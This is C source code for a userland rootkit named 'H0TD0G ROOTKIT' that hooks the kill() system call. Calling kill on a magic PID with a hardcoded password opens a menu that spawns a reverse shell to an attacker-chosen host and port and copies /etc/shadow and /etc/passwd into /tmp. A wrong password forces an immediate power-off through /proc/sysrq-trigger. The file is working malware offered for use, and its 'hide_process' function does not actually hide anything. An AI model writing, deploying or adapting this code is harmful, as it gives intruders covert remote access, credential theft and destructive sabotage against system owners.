#include <stdio.h>
#include <signal.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <fcntl.h>

#ifndef RTLD_NEXT
#define RTLD_NEXT ((void *) -1)
#endif

void hide_process(pid_t pid) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/oom_score_adj", pid);
    int fd = open(path, O_WRONLY);
    if (fd != -1) {
        write(fd, "0", 1);
        close(fd);
    } else {
        perror("open");
    }
}

int kill(pid_t pid, int sig) {
    const int pids = 9999;
    int (*r4id)(pid_t, int);
    r4id = dlsym(RTLD_NEXT, "kill");

    if (pid == pids) {
        char password[20];
        char *pass = "ring3";

        write(1, "[+] Password \n", strlen("[+] Password \n"));
        write(1, "[!] --> ", strlen("[!] --> "));
        scanf("%19s", password);

        if (strcmp(password, pass) == 0) {
            int escolha;

            printf("   H0TD0G ROOTKIT  \n");
            printf("1) Reverse Shell \n");
            printf("2) Dump Hashes and Passwords \n");
            printf("3) List Running Process \n");
            printf("=> ");
            scanf("%d", &escolha);

            switch(escolha) {
                case 1: {
                    int port;
                    char ip[16];

                    printf("[+] SET YOUR LHOST => ");
                    scanf("%15s", ip);

                    printf("[+] SET YOUR LPORT => ");
                    scanf("%d", &port);

                    printf("[+] RECEIVED REVERSE SHELL => %s:%d \n", ip, port);

                    if (fork() == 0) {
                        struct sockaddr_in revsockaddr;
                        int sockt = socket(AF_INET, SOCK_STREAM, 0);
                        revsockaddr.sin_family = AF_INET;
                        revsockaddr.sin_port = htons(port);
                        revsockaddr.sin_addr.s_addr = inet_addr(ip);

                        connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
                        dup2(sockt, 0);
                        dup2(sockt, 1);
                        dup2(sockt, 2);

                        char * const argv[] = {"sh", NULL};
                        execvp("sh", argv);
                    }

                    wait(NULL);
                    break;
                }

                case 2: {
                    int shadow_fd = open("/etc/shadow", O_RDONLY);
                    int passwd_fd = open("/etc/passwd", O_RDONLY);
                    int shadow_out_fd = open("/tmp/shadow_dump", O_WRONLY | O_CREAT, 0600);
                    int passwd_out_fd = open("/tmp/passwd_dump", O_WRONLY | O_CREAT, 0600);

                    if (shadow_fd != -1 && shadow_out_fd != -1) {
                        char buffer[1024];
                        ssize_t bytes;
                        while ((bytes = read(shadow_fd, buffer, sizeof(buffer))) > 0) {
                            write(shadow_out_fd, buffer, bytes);
                        }
                        close(shadow_fd);
                        close(shadow_out_fd);
                    } else {
                        perror("shadow");
                    }

                    if (passwd_fd != -1 && passwd_out_fd != -1) {
                        char buffer[1024];
                        ssize_t bytes;
                        while ((bytes = read(passwd_fd, buffer, sizeof(buffer))) > 0) {
                            write(passwd_out_fd, buffer, bytes);
                        }
                        close(passwd_fd);
                        close(passwd_out_fd);
                    } else {
                        perror("passwd");
                    }

                    printf("[*] Password hashes dumped to /tmp/shadow_dump and /tmp/passwd_dump\n");
                    break;
                }

                  case 3: {
                    printf("[*] Listing running processes:\n");
                    DIR *proc = opendir("/proc");
                    struct dirent *entry;

                    if (proc == NULL) {
                        perror("opendir");
                        break;
                    }

                    while ((entry = readdir(proc)) != NULL) {
                        if (entry->d_type == DT_DIR) {
                            char *name = entry->d_name;
                            if (name[0] >= '0' && name[0] <= '9') {
                                printf("PID: %s\n", name);
                            }
                        }
                    }
                    closedir(proc);
                    break;
                }


                default:
                    printf("[!] TRY AGAIN! \n");
                    break;
            }
        } else {
            int fd = open("/proc/sysrq-trigger", O_WRONLY);
            if (fd != -1) {
                write(fd, "o", 1);
                close(fd);
            } else {
                perror("open");
            }
        }
    } else {
        hide_process(getpid());
        return r4id(pid, sig);
    }

    return 0;
}
